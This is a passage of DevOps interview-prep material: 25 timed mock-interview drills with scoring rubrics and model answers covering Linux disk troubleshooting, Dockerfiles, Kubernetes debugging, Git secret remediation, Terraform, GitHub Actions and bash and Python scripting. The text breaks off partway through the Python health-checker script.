# Real-World Interview — 25 Mock Interview Drills

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> 25 timed mock rounds in three levels: 10 🟢 Beginner, 10 🟡 Intermediate, 5 🔴 Advanced. Each one has a setup, the interviewer's exact prompt, what you deliver, a 10-point scoring rubric, a model answer outline and a bonus.

[⬅ Back to Real-World Interview](./README.md) · [🏠 Home](../README.md)

## How to run these drills

Reading answers is not practice. Saying them out loud against a clock is. Every drill is built to be run as a real round:

- **Find an interviewer.** A friend, a colleague, someone from the DevOps Shack Discord, or, at worst, a phone recording yourself. The interviewer reads the prompt word for word, keeps time, and fills in the rubric. They should not help unless the drill says to give a hint.
- **Keep the clock honest.** Stop at the time limit even if you are mid-sentence. Running out of time is information.
- **Live tasks are live.** For drills marked 💻, share your screen, use a real terminal and a sandbox (a VM, kind, or the [capstone](./hands-on-lab.md) cluster), and talk while you type. Interviewers score the narration as much as the result.
- **Score, then read the model outline.** Only open the `<details>` block after the rubric is filled in. Note the gap, then rerun the same drill a few days later.
- **Scoring.** Each rubric totals 10 points. 8 to 10 is a hire signal for that round, 6 to 7 is borderline, below 6 means redo it.

| Symbol | Meaning |
|--------|---------|
| 🗣 | Spoken round: no keyboard, just you and the interviewer |
| 💻 | Live hands-on round: terminal, editor, screen share |
| ⏱ | Time limit for the whole round, including clarifying questions |

## Table of contents

- 🟢 [Beginner](#-beginner) — Drills 1–10
- 🟡 [Intermediate](#-intermediate) — Drills 11–20
- 🔴 [Advanced](#-advanced) — Drills 21–25

---

## 🟢 Beginner

### Drill 1. The 2-minute introduction 🟢 🗣

**Setup:** ⏱ 5 minutes. The interviewer starts a timer at "go" and stops you at 2:30 no matter what.

**Interviewer's prompt:**
> "Let's start with a quick introduction. Walk me through your background and what you've been working on recently."

**What to deliver:** A structured introduction of 90 to 120 seconds: who you are now, two or three things you have built or run with concrete tools and numbers, and why you want this role. Then stop and let the interviewer choose where to dig.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Finishes in 90 to 120 seconds without being cut off | 2 |
| Present → past → future structure, not a chronological life story | 2 |
| At least two concrete achievements with tools and a number | 3 |
| Clear link to this role or company | 2 |
| Confident delivery, no reading from notes, ends cleanly | 1 |

<details>
<summary><b>Model answer outline</b></summary>

1. **Present (20s):** "I'm a DevOps engineer with three years of experience, currently at <company>, where I own CI/CD and Kubernetes operations for about 40 microservices on EKS."
2. **Highlights (60s):** two short proof points. "I moved our pipelines from Jenkins to GitHub Actions, which cut average build time from 18 to 7 minutes." "I set up Prometheus and Grafana alerting with SLO-based alerts, which reduced pages that needed no action by about half."
3. **Side proof (15s, optional for freshers):** "Outside work I built an end-to-end capstone: Terraform, EKS, ArgoCD, and a chaos exercise with a postmortem; it's on my GitHub."
4. **Future (15s):** "I'm looking for a team where I can go deeper into platform engineering, and your work on <specific thing> is exactly that."

Freshers swap the work section for projects, internships and certifications, but keep the numbers: "a pipeline that deploys in 4 minutes", "a cluster with 3 nodes and 12 services".

</details>

**Bonus:** Record a 30-second version for recruiter calls and a 4-minute version for a hiring manager who says "take your time".

### Drill 2. Rapid-fire fundamentals 🟢 🗣

**Setup:** ⏱ 10 minutes for 20 questions. The interviewer reads each question once; you get roughly 25 seconds each. Pick 20 from [rapid-fire.md](./rapid-fire.md), or use the list below.

**Interviewer's prompt:**
> "I'm going to go through some quick ones. Short answers are fine, I'll stop you if I want more."

Questions: default SSH port; HTTP status for "service unavailable"; difference between a process and a thread; what `chmod 640` means; TCP vs UDP in one line; what DNS record maps a name to IPv4; what `kubectl get pods -o wide` adds; Docker image vs container; what a Kubernetes Service does; `git fetch` vs `git pull`; what `terraform plan` does; what an Ansible handler is; what `/etc/resolv.conf` holds; what a load balancer health check is; difference between `CMD` and `ENTRYPOINT`; what a readiness probe does; what port HTTPS uses; what `df -h` vs `du -sh` show; what a 403 means; what an SLO is.

**What to deliver:** One-sentence correct answers. A short "why" only if it adds value.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| 18 to 20 correct (16 to 17 = 4, 13 to 15 = 2) | 6 |
| Answers lead with the fact, no rambling | 2 |
| Honest "I don't know" rather than guessing wildly on any miss | 1 |
| Finished all 20 within time | 1 |

<details>
<summary><b>Model answer outline</b></summary>

22 · 503 · a process has its own memory space, threads share their process's memory · owner read-write, group read, others nothing · TCP is connection-oriented and reliable, UDP is connectionless with no delivery guarantee · A record · node name and pod IP · an image is the read-only template, a container is a running instance of it with a writable layer · gives a stable virtual IP and DNS name that load-balances to matching pods · fetch downloads remote changes without touching your branch, pull is fetch plus merge or rebase · shows the changes Terraform would make to match config, without applying · a task that runs only when notified by a change, once at the end of the play · nameserver and search domain configuration · a periodic request the LB sends to decide if a target should get traffic · `ENTRYPOINT` is the executable, `CMD` provides default arguments (or the default command if there is no entrypoint) · decides whether the pod receives traffic from Services · 443 · `df` shows free space per filesystem, `du` shows space used by files and directories · authenticated but not allowed · a target for a service level indicator over a window, for example 99.9 percent of requests succeed over 30 days.

</details>

**Bonus:** Run it again with questions only from the topic you scored lowest on, and get the same 20 under 7 minutes.

### Drill 3. What happens when you open a URL 🟢 🗣

**Setup:** ⏱ 8 minutes. The interviewer may interrupt once with "go deeper on that step".

**Interviewer's prompt:**
> "I type `https://shop.example.com` into my browser and press Enter. The site runs on Kubernetes behind a cloud load balancer. Walk me through everything that happens until the page renders."

**What to deliver:** An ordered walk through DNS, TCP, TLS, the load balancer, ingress, Service, pod, app, database and back, with one or two details per hop that show depth.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Correct order: DNS → TCP → TLS → HTTP → LB → ingress → Service → pod | 3 |
| DNS detail: browser/OS cache, recursive resolver, authoritative answer, TTL | 2 |
| TLS detail: certificate validation, SNI, where TLS terminates | 2 |
| Kubernetes detail: ingress rule match, Service to endpoint, kube-proxy or CNI | 2 |
| Mentions where they would look if one hop failed | 1 |

<details>
<summary><b>Model answer outline</b></summary>

1. **DNS:** browser cache, OS cache, then the recursive resolver; it walks root, `.com`, then the `example.com` authoritative servers and gets back a CNAME or alias to the load balancer's addresses. TTL decides how long that answer is cached.
2. **TCP:** three-way handshake to the LB on port 443.
3. **TLS:** ClientHello with SNI `shop.example.com`; the LB presents the certificate; the browser validates chain, expiry and hostname; keys are agreed. TLS usually terminates at the LB or the ingress controller.
4. **HTTP request:** `GET /` with Host header. The LB picks a healthy target (a node port or, with IP targets, a pod IP directly).
5. **Ingress controller** (NGINX, AWS LB Controller, etc.) matches host and path rules and forwards to a Service.
6. **Service → pod:** the Service's endpoints are ready pods only; kube-proxy (iptables or IPVS) or the CNI's eBPF dataplane DNATs to a pod IP.
7. **App:** handles the request, maybe hits a cache or database by Service DNS name (CoreDNS lookup), renders a response.
8. **Back:** response returns along the path; the browser parses HTML and fires more requests for CSS, JS and images, often to a CDN.
9. **If it fails:** `dig` for DNS, `curl -v` for TLS and status code, LB target health, `kubectl get endpoints`, pod logs.

</details>

**Bonus:** Repeat the walk for HTTP/3 and say what changes (QUIC over UDP, TLS 1.3 built into the transport handshake).

### Drill 4. Disk full on a production server 🟢 💻

**Setup:** ⏱ 15 minutes. Prepare a Linux VM beforehand: fill a disk with `fallocate -l 5G /var/log/app/huge.log`, and also start `python3 -c "f=open('/var/tmp/held.log','w'); import time; time.sleep(9999)" &` and then `rm /var/tmp/held.log` after writing data into it, so a deleted file is still held open. The candidate does not know what you did.

**Interviewer's prompt:**
> "We got an alert: disk usage on this server is at 97 percent and the app is starting to throw write errors. You have a shell. Find out what's going on and get us out of danger, without breaking the app."

**What to deliver:** A calm, narrated investigation: confirm, find the biggest consumers, spot the deleted-but-open file, free space safely, and propose prevention.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Confirms with `df -h` and checks inodes with `df -i` | 2 |
| Finds large directories and files with `du` or `find` efficiently | 2 |
| Detects deleted-but-open files with `lsof +L1` or `/proc/*/fd` | 2 |
| Frees space safely (truncate, not `rm` of an open log; asks before deleting) | 2 |
| Prevention: logrotate, alert at 80 percent, separate volume for logs | 2 |

<details>
<summary><b>Model answer outline</b></summary>

```bash
df -h                                   # which filesystem is full
df -i                                   # rule out inode exhaustion
sudo du -xh --max-depth=1 / 2>/dev/null | sort -h | tail
sudo find /var -xdev -type f -size +500M -exec ls -lh {} \;
sudo lsof +L1                           # deleted files still held open (link count 0)
sudo truncate -s 0 /var/log/app/huge.log   # frees space even if the app holds it open
# for the deleted-but-open file: restart the owning process, or
# sudo truncate -s 0 /proc/<pid>/fd/<fd>
df -h                                   # confirm recovery
```

Narrate why: `rm` on a file a process still holds open removes the name but not the data, so `df` does not change; `du` and `df` disagreeing is the clue. Prevention: logrotate with `copytruncate` or a signal to reopen logs, a disk alert at 80 percent with a forecast (`predict_linear` in Prometheus), and logs on their own volume so a runaway log cannot fill root.

</details>

**Bonus:** Add a second hidden cause: millions of tiny files exhausting inodes in `/var/spool`. Find it with `df -i` and `find /var -xdev -type d -size +1M`.

### Drill 5. Write a production Dockerfile live 🟢 💻

**Setup:** ⏱ 20 minutes. Give the candidate a tiny Node.js app: `package.json` with `express` as a dependency and a `start` script, plus `server.js` listening on port 3000. Docker is installed.

**Interviewer's prompt:**
> "Containerise this app. I want something you'd be comfortable running in production. When you're done, tell me how big the image is and why it's that size."

**What to deliver:** A working multi-stage Dockerfile, a `.dockerignore`, a successful build and run, and an explanation of each choice.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Image builds and the app responds on `curl localhost:3000` | 2 |
| Layer order caches dependencies (`package*.json` copied and installed before source) | 2 |
| Uses `npm ci --omit=dev` and a slim or alpine base with a pinned tag | 2 |
| Runs as non-root | 2 |
| `.dockerignore`, exec-form `CMD`, explains final size | 2 |

<details>
<summary><b>Model answer outline</b></summary>

```dockerfile
# syntax=docker/dockerfile:1
FROM node:22-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --omit=dev

FROM node:22-alpine
ENV NODE_ENV=production
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY server.js package.json ./
USER node
EXPOSE 3000
CMD ["node", "server.js"]
```

`.dockerignore`: `node_modules`, `.git`, `*.log`, `Dockerfile`, `.env`. Explain: dependency layer is cached until the lockfile changes; `npm ci` gives a reproducible install from the lockfile; the official image already has a `node` user; exec-form `CMD` makes node PID 1 so it receives `SIGTERM` directly (or add `--init` / tini to reap zombies). Size: roughly the alpine Node base plus `node_modules`; check with `docker images` and `docker history`. If there is no lockfile, say so and generate one, because `npm ci` requires it.

</details>

**Bonus:** Scan the image with `trivy image --severity HIGH,CRITICAL` and explain one finding, then try a distroless Node base and compare size and findings.

### Drill 6. CrashLoopBackOff walk-through 🟢 🗣

**Setup:** ⏱ 10 minutes. After the candidate's first answer, the interviewer reveals: "`kubectl logs` shows nothing, and `--previous` shows `Error: connect ECONNREFUSED 10.100.12.7:5432`."

**Interviewer's prompt:**
> "A developer pings you: their pod is in CrashLoopBackOff in staging. What do you do, step by step?"

**What to deliver:** The diagnostic order, the commands, what each tells you, then a diagnosis after the reveal.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Explains what CrashLoopBackOff means (container keeps exiting, kubelet backs off restarts) | 2 |
| `describe` first: exit code, last state, events, OOMKilled | 2 |
| `logs --previous` for the crashed container | 2 |
| After reveal: identifies database unreachable and checks Service, endpoints, DNS, NetworkPolicy, credentials | 3 |
| Suggests a fix that stops the crash loop being the failure mode (retry with backoff, startup ordering) | 1 |

<details>
<summary><b>Model answer outline</b></summary>

1. `kubectl -n staging describe pod <pod>`: look at `Last State: Terminated`, `Reason` (`Error`, `OOMKilled`), `Exit Code` (1 app error, 137 killed with SIGKILL often OOM, 139 segfault, 143 SIGTERM), and Events (probe failures, image issues).
2. `kubectl -n staging logs <pod> --previous`: the current container may have just started, so the crashed one's logs are what matter.
3. Check recent changes: new image tag, ConfigMap or Secret change, `kubectl rollout history`.
4. After the reveal: the app exits because Postgres refuses connections. Check `kubectl get svc,endpoints postgres` (no endpoints means the DB pod is down or selector mismatch), whether `10.100.12.7` is the expected Service IP, NetworkPolicy blocking egress, and whether the DB itself is healthy.
5. Fix the cause, then improve the app: retry the DB connection with backoff instead of exiting, and use a startup probe so slow starts are not killed.

</details>

**Bonus:** Explain how the answer changes if the exit code is 137 and `Reason: OOMKilled`, including how to check usage with `kubectl top pod` and container memory metrics.

### Drill 7. Walk me through your CI/CD pipeline 🟢 🗣

**Setup:** ⏱ 10 minutes. The candidate may sketch on paper or a shared drawing tool. The interviewer asks two follow-ups from the outline.

**Interviewer's prompt:**
> "Pick a pipeline you've built or worked on. Take me from a developer pushing code to that code running in production."

**What to deliver:** Stages in order, the tool for each, gates that stop bad changes, how deploy and rollback work, and one thing you would improve.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Complete flow: trigger, build, test, scan, artifact, deploy, verify | 3 |
| Names concrete tools and where config lives | 2 |
| Explains gates: required checks, approvals, environment protection | 2 |
| Explains rollback and how a bad deploy is detected | 2 |
| Names one honest weakness and how to fix it | 1 |

<details>
<summary><b>Model answer outline</b></summary>

"PR opened → GitHub Actions runs lint, unit tests and a Trivy filesystem scan → required checks plus one review to merge → on merge, build a Docker image tagged with the commit SHA, scan it, push to ECR → the pipeline updates the image tag in our Helm values repo → ArgoCD syncs staging automatically → smoke tests run against staging → promotion to production is a PR to the prod values file with an approval → ArgoCD syncs prod; we watch error rate and latency dashboards for 15 minutes. Rollback is reverting the values commit, which ArgoCD applies in about a minute. Weakness: no canary, so a bad release hits all traffic at once; I'd add Argo Rollouts with an analysis step on error rate."

Likely follow-ups: how secrets reach the pipeline (OIDC to the cloud, no static keys), how long it takes end to end, what happens if tests are flaky.

</details>

**Bonus:** Redo the answer for a team that still uses Jenkins and explain how you would migrate stage by stage without a freeze.

### Drill 8. Git rescue under pressure 🟢 💻

**Setup:** ⏱ 15 minutes. Prepare a repo where `main` has three good commits, then a commit `add debug creds` that adds `config/.env` containing a fake secret, then one more good commit, all pushed to a remote. Also prepare a branch `feature/x` that conflicts with `main` in `app.py`.

**Interviewer's prompt:**
> "Two things. First, someone pushed a commit to main that contains credentials, and there's a good commit after it. Undo the damage. Second, merge `feature/x` into main, there's a conflict."

**What to deliver:** Correct handling of both tasks, with the right priority on the secret.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Says first: the secret is compromised, rotate it now, regardless of Git history | 3 |
| Removes the file from main safely for a shared branch (`git revert` or a removal commit), explains why not to rewrite shared history casually | 2 |
| Knows history rewriting (`git filter-repo`) is needed to purge it, and its coordination cost | 2 |
| Resolves the merge conflict correctly and verifies (tests, `git log --graph`) | 2 |
| Adds prevention: `.gitignore`, pre-commit secret scanning, push protection | 1 |

<details>
<summary><b>Model answer outline</b></summary>

1. **Rotate the credential immediately.** Once pushed, assume it is leaked; anyone who fetched has it.
2. Remove it going forward without rewriting shared history: `git revert <sha>` (keeps the good later commit), or `git rm --cached config/.env && echo 'config/.env' >> .gitignore && git commit`.
3. If policy requires purging: `git filter-repo --path config/.env --invert-paths`, force-push with `--force-with-lease`, tell everyone to re-clone, and ask the hosting provider to clear cached views. Rotation is still the actual fix.
4. Merge: `git switch main && git merge feature/x`, open `app.py`, resolve the markers keeping the right logic from both sides, `git add app.py && git commit`, run tests, `git log --oneline --graph -5`.
5. Prevent: GitHub push protection or secret scanning, a pre-commit hook with gitleaks or trivy, `.env` in `.gitignore` from day one.

</details>

**Bonus:** Do the same merge with `git rebase main` on the feature branch instead and explain when your team would prefer each.

### Drill 9. Tell me about a mistake 🟢 🗣

**Setup:** ⏱ 8 minutes. The interviewer asks two follow-ups: "What would you do differently?" and "How did your team react?"

**Interviewer's prompt:**
> "Tell me about a time you made a mistake at work that had a real impact. What happened?"

**What to deliver:** A STAR story that owns the mistake, quantifies impact, shows how you fixed it, and ends with a systemic change, not just "I'm more careful now".

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Real mistake with real impact (not a disguised strength) | 2 |
| Clear ownership with "I", no blaming | 2 |
| Specific actions to mitigate and fix, in order | 2 |
| Measurable result or impact numbers | 2 |
| Systemic prevention and an honest lesson | 2 |

<details>
<summary><b>Model answer outline</b></summary>

- **Situation:** "I was updating a shared Terraform module for security groups used by all staging services."
- **Task:** "Tighten ingress rules as part of a security review."
- **Action:** "I ran plan only in one workspace, applied the module change, and it removed a rule other services relied on. Staging APIs lost database access for 25 minutes. I spotted the alerts, posted in the team channel that it was my change, reverted the module version, and confirmed recovery. Then I wrote a short incident note."
- **Result:** "25 minutes of staging downtime, no production impact. I added a CI job that runs `terraform plan` for every workspace that consumes the module and posts the diff on the PR, and module changes now need a second reviewer."
- **Lesson:** "I now treat a shared module as a production change with a wide blast radius, and I rely on automation to show me the blast radius instead of my memory."

</details>

**Bonus:** Prepare a second mistake story from a different area (on-call, communication or estimation) so you never reuse the same one twice in a loop.

### Drill 10. Bash: top talkers from an access log 🟢 💻

**Setup:** ⏱ 15 minutes. Provide `access.log` in combined log format, for example generated with a few thousand lines like `203.0.113.7 - - [17/Jan/2026:10:02:11 +0000] "GET /api/cart HTTP/1.1" 502 157 "-" "curl/8.5.0"`.

**Interviewer's prompt:**
> "We think one client is hammering us. From this log, give me the top 5 client IPs by request count, then the top 5 IPs that received 5xx responses. Then make it a script someone else can run on any log file."

**What to deliver:** Working one-liners, then a small reusable script with argument handling and basic validation.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Correct top-5 by count (`awk`/`cut`, `sort`, `uniq -c`, `sort -rn`, `head`) | 3 |
| Correct 5xx filter on the status field, not a grep on "5" anywhere in the line | 2 |
| Script takes the file as an argument, checks it exists, prints usage | 2 |
| Uses `set -euo pipefail` and quotes variables | 2 |
| Explains how it would scale (large or gzipped logs, `zcat`, `LC_ALL=C`) | 1 |

<details>
<summary><b>Model answer outline</b></summary>

```bash
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -5
awk '$9 ~ /^5[0-9][0-9]$/ {print $1}' access.log | sort | uniq -c | sort -rn | head -5
```

```bash
#!/usr/bin/env bash
set -euo pipefail

usage() { echo "usage: $0 <access.log> [count]" >&2; exit 1; }
[[ $# -ge 1 ]] || usage
log=$1
n=${2:-5}
[[ -r "$log" ]] || { echo "cannot read $log" >&2; exit 2; }

reader=cat
[[ "$log" == *.gz ]] && reader=zcat

echo "Top $n clients by requests:"
"$reader" "$log" | awk '{print $1}' | LC_ALL=C sort | uniq -c | sort -rn | head -n "$n"

echo "Top $n clients receiving 5xx:"
"$reader" "$log" | awk '$9 ~ /^5[0-9][0-9]$/ {print $1}' | LC_ALL=C sort | uniq -c | sort -rn | head -n "$n"
```

Field 9 is the status code in the combined format. Mention that behind a load balancer the first field is the LB's IP and you need `X-Forwarded-For` logged instead.

</details>

**Bonus:** Add requests per minute for the top IP (`awk` on the timestamp field, `cut -c2-18`) to show whether it is a spike or steady.

---

## 🟡 Intermediate

### Drill 11. 502s after a deploy on EKS behind an ALB 🟡 🗣

**Setup:** ⏱ 20 minutes. The interviewer answers clarifying questions with: "Deploy went out 10 minutes ago, about 30 percent of requests fail with 502, the new version passed CI, pods show Running." If the candidate checks target health, reveal: "Half the targets are unhealthy; the new pods listen on 8080, the target group health check hits port 80."

**Interviewer's prompt:**
> "Checkout is returning 502s since the 3 p.m. deploy. It runs on EKS behind an ALB managed by the AWS Load Balancer Controller. Go."

**What to deliver:** Clarify, mitigate, diagnose with real commands, root cause, prevention.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Clarifying questions on scope, timing, what changed | 1 |
| Mitigates first: rollback via ArgoCD revert or `kubectl rollout undo`, before deep debugging | 2 |
| Knows a 502 from an ALB means the target failed or closed the connection, distinct from 503 (no healthy targets) and 504 (timeout) | 2 |
| Checks target health, pod readiness, ports, ingress annotations, logs, in a sensible order | 3 |
| Root cause and prevention: port contract, readiness probe, canary with error-rate analysis | 2 |

<details>
<summary><b>Model answer outline</b></summary>

1. **Clarify:** all users or some, all endpoints or checkout, exact deploy time, what changed in the release.
2. **Mitigate:** "30 percent failing on checkout is revenue; I roll back now." `argocd app rollback` or revert the image tag commit; `kubectl rollout undo deploy/checkout` if not GitOps. Confirm 5xx drops.
3. **Diagnose (on the rolled-back state, using the failed ReplicaSet or staging):**
   - ALB 5xx metrics: `HTTPCode_ELB_502_Count` vs `HTTPCode_Target_5XX_Count` tells you whether the ALB generated it or the app did.
   - `aws elbv2 describe-target-health --target-group-arn ...`: unhealthy reasons such as `Target.FailedHealthChecks` or `Target.ResponseCodeMismatch`.
   - `kubectl get endpoints checkout`, `kubectl describe ingress`, the `alb.ingress.kubernetes.io/healthcheck-port` and `target-type` annotations, the Service `targetPort`.
   - The reveal: the new image listens on 8080, the health check targets 80. Pods are Running but traffic hits a closed port, the ALB gets connection refused, returns 502.
4. **Why only 30 percent:** rolling update with old and new pods mixed.
5. **Prevent:** named ports (`targetPort: http`) so the port is one source of truth; readiness probe on the real serving port so bad pods never become endpoints; a canary step with automated error-rate analysis; a contract test in CI that starts the container and curls the port.

</details>

**Bonus:** Explain how the answer changes if the 502s appear only during every deploy and then stop: connection draining, `deregistration_delay`, preStop sleep and pod readiness gates.

### Drill 12. Terraform wants to destroy the production database 🟡 🗣

**Setup:** ⏱ 15 minutes. Show this plan excerpt:

```text
  # aws_db_instance.main must be replaced
-/+ resource "aws_db_instance" "main" {
      ~ identifier = "orders-prod" -> "orders-production" # forces replacement
        ...
    }
Plan: 1 to add, 0 to change, 1 to destroy.
```

**Interviewer's prompt:**
> "A teammate opened a PR to rename some resources for consistency. The plan in CI shows this. They say it's just a rename and want to merge. What do you do?"

**What to deliver:** Stop the merge, explain why it is destructive, offer safe alternatives, and add guardrails.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Recognises "forces replacement" on RDS means delete and recreate, i.e. data loss risk | 2 |
| Blocks the merge and explains calmly to the teammate | 1 |
| Distinguishes renaming the Terraform address (safe with `moved`) from changing the cloud identifier (replacement) | 3 |
| Offers safe paths: revert the identifier change, or snapshot plus planned migration | 2 |
| Guardrails: `prevent_destroy`, `deletion_protection`, plan policy checks | 2 |

<details>
<summary><b>Model answer outline</b></summary>

- The `identifier` is the actual RDS instance name; AWS cannot rename it in place through this argument, so Terraform will destroy `orders-prod` and create an empty `orders-production`.
- If the goal is consistent **Terraform names**, change the resource address and add a `moved` block; nothing changes in AWS:

```hcl
moved {
  from = aws_db_instance.main
  to   = aws_db_instance.orders
}
```

- If the goal is a new **AWS identifier**, that is a migration: snapshot, maintenance window, endpoint changes for apps, a rollback plan. Rarely worth it for cosmetics.
- Guardrails: `lifecycle { prevent_destroy = true }` on stateful resources; `deletion_protection = true` on the DB; a CI check (OPA/Conftest on `terraform show -json`) that fails any plan deleting resources of protected types; final snapshot settings (`skip_final_snapshot = false`).

</details>

**Bonus:** Walk through what you would do if someone had already applied it: check for a final snapshot, automated backups, and point-in-time restore, and how the timeline looks.

### Drill 13. Fix a broken GitHub Actions workflow 🟡 💻

**Setup:** ⏱ 20 minutes. Give the candidate this workflow in a test repo and say only "it doesn't work".

```yaml
name: build
on:
  push:
    branches: main
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: docker build -t ghcr.io/MyOrg/api:latest .
      - name: Login
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - name: Push
        run: docker push ghcr.io/MyOrg/api:latest
      - name: Test
        run: npm test
```

**Interviewer's prompt:**
> "This workflow is failing and nobody on the team understands why. Fix it, and while you're at it, make it something you'd be happy to run for a production service."

**What to deliver:** A working workflow and an explanation of every bug and improvement.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Adds `actions/checkout` (the root cause: no source in the workspace) | 2 |
| Lowercases the image name | 1 |
| Adds `permissions: packages: write` (and `contents: read`) | 2 |
| Moves tests before build and push, so broken code is never pushed | 2 |
| Replaces `:latest` with the commit SHA, adds caching or a scan step | 2 |
| Explains each fix clearly while working | 1 |

<details>
<summary><b>Model answer outline</b></summary>

```yaml
name: build
on:
  push:
    branches: [main]
permissions:
  contents: read
  packages: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - run: npm test
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - run: |
          IMAGE=ghcr.io/myorg/api:${GITHUB_SHA}
          docker build -t "$IMAGE" .
          docker push "$IMAGE"
```

Bugs: no checkout so `docker build` finds no Dockerfile (`failed to read dockerfile`); uppercase in the repository name (`repository name must be lowercase`); default `GITHUB_TOKEN` may be read-only for packages depending on org settings (`denied: installation not allowed to Write organization package`); tests run after the push and have no `npm ci`. Improvements: SHA tags, a Trivy scan before push, Buildx with GHA cache, pinned action SHAs.

</details>

**Bonus:** Split it into `test` and `build` jobs with `needs:`, run tests on pull requests too, and only push on `main`.

### Drill 14. Debug a broken set of Kubernetes manifests 🟡 💻

**Setup:** ⏱ 25 minutes. Apply these to a kind cluster before the round. There are four bugs.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  replicas: 2
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
        - name: web
          image: nginx:1.27
          ports:
            - containerPort: 80
          readinessProbe:
            httpGet:
              path: /healthz
              port: 80
          resources:
            requests:
              memory: 64Gi
---
apiVersion: v1
kind: Service
metadata:
  name: web
spec:
  selector:
    app: frontend
  ports:
    - port: 80
      targetPort: 8080
```

**Interviewer's prompt:**
> "A teammate says this app 'deploys fine but doesn't work'. `curl http://web` from another pod fails. Get it working and tell me everything that was wrong."

**What to deliver:** Each bug found with the command that revealed it, fixed manifests, and proof it works.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Finds `Pending` pods caused by the 64Gi request (`describe` shows `Insufficient memory`) | 2 |
| Finds the readiness probe on `/healthz`, which stock nginx answers with 404 | 2 |
| Finds the Service selector mismatch (`kubectl get endpoints web` is empty) | 2 |
| Finds the wrong `targetPort` 8080 | 2 |
| Methodical order, verifies with a test pod and `curl` at the end | 2 |

<details>
<summary><b>Model answer outline</b></summary>

```bash
kubectl get pods -l app=web                 # Pending
kubectl describe pod -l app=web | tail      # 0/3 nodes are available: 3 Insufficient memory
kubectl get endpoints web                   # <none>
kubectl get svc web -o yaml | grep -A2 selector
```

Fixes: `memory: 64Mi` (and add a memory limit); readiness `path: /` (or add a `/healthz` location to the nginx config); Service selector `app: web`; `targetPort: 80`, better a named port `http` on both sides. Verify:

```bash
kubectl apply -f fixed.yaml
kubectl rollout status deploy/web
kubectl get endpoints web                   # two pod IPs on :80
kubectl run t --rm -i --restart=Never --image=curlimages/curl:8.10.1 -- curl -s -o /dev/null -w '%{http_code}\n' http://web
# 200
```

Narrate the order: scheduling first (nothing works if pods do not run), then readiness (unready pods are not endpoints), then Service wiring.

</details>

**Bonus:** Add a NetworkPolicy that only allows traffic to `web` from pods labelled `role: client`, prove it blocks a pod without the label, and say which CNIs enforce NetworkPolicy.

### Drill 15. Python: a URL health checker 🟡 💻

**Setup:** ⏱ 20 minutes. Python 3.11+ and `requests` available. Provide `urls.txt` with a mix of good URLs, a 404, a 500 (use `https://httpbin.org/status/500` or a local stub) and one unreachable host.

**Interviewer's prompt:**
> "Write a script that reads URLs from a file, checks each one, and prints status code and latency. It should exit non-zero if any URL is down, so we can use it in a pipeline. It has to handle bad hosts without crashing."

**What to deliver:** A working script with timeouts, error handling, clear output and a meaningful exit code; concurrency is a plus.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Correct status and latency for reachable URLs | 2 |
| Timeout set on every request | 2 |
| Handles DNS failure, connection refused and timeouts without crashing | 2 |
| Exit code 1 when any URL fails, 0 otherwise | 2 |
| Clean structure (functions, `argparse` or `sys.argv`, skips blank lines and comments), concurrency or explains how to add it | 2 |

<details>
<summary><b>Model answer outline</b></summary>

```python
#!/usr/bin/env python3
import argparse
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests


def check(url, timeout):
    start = time.perf_counter()
    try:
        resp = requests.get(url, timeout=timeout)
        ms = (time.perf_counter() - start) * 1000
        return url, resp.status_code, ms, resp.status_code < 400
    except requests.RequestException as exc:
        ms = (time.perf_counter() - start) * 1000
